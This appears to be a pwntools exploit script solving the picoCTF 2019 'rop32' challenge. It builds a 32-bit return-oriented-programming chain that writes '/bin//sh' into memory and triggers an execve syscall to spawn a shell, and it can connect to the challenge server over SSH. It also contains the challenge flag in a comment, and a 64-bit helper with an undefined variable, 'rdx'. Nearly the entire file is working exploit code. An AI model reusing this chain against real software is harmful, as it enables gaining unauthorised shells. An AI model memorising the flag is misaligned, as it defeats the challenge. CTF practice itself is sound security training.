from pwn import *
import sys
import subprocess
import r2pipe
# picoCTF{rOp_t0_b1n_sH_3fa3615a}
argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

if context.bits == 64:
  r = process(['ROPgadget', '--binary', BINARY])
  gadgets = r.recvall().strip().split('\n')[2:-2]
  gadgets = map(lambda x: x.split(' : '),gadgets)
  gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
  r.close()

  pop_rdi = 0
  pop_rsi_r15 = 0
  pop_rdx = 0

  for addr, name in gadgets:
    if 'pop rdi ; ret' in name:
      pop_rdi = addr
    if 'pop rsi ; pop r15 ; ret' in name:
      pop_rsi_r15 = addr
    if 'pop rdx ; ret' in name:
      pop_rdx = addr

  def call(f, a1, a2, a3):
    out = ''
    if a1 != None:
      out += p64(pop_rdi)+p64(a1)
    if a2 != None:
      out += p64(pop_rsi_r15)+p64(a2)*2
    if a3 != None:
      if pop_rdx == 0:
        print 'RDX GADGET NOT FOUND'
        exit(-1)
      else:
        out += p64(rdx)+p64(a3)
    return out+p64(f)

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process('vuln', cwd='/problems/rop32_3_b5305a898147ab65734ad8490af4265f')
  REMOTE = True


# ROPgadget --binary ./vuln --rop --badbytes "0a"
from struct import pack

p = 'a'*(28)
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += '/bin'
p += pack('<I', 0x080da060) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4
p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += '//sh'
p += pack('<I', 0x080da064) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080da060) # padding without overwrite ebx
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x08049563) # int 0x80

sh.sendlineafter('?\n', p)

sh.interactive()
  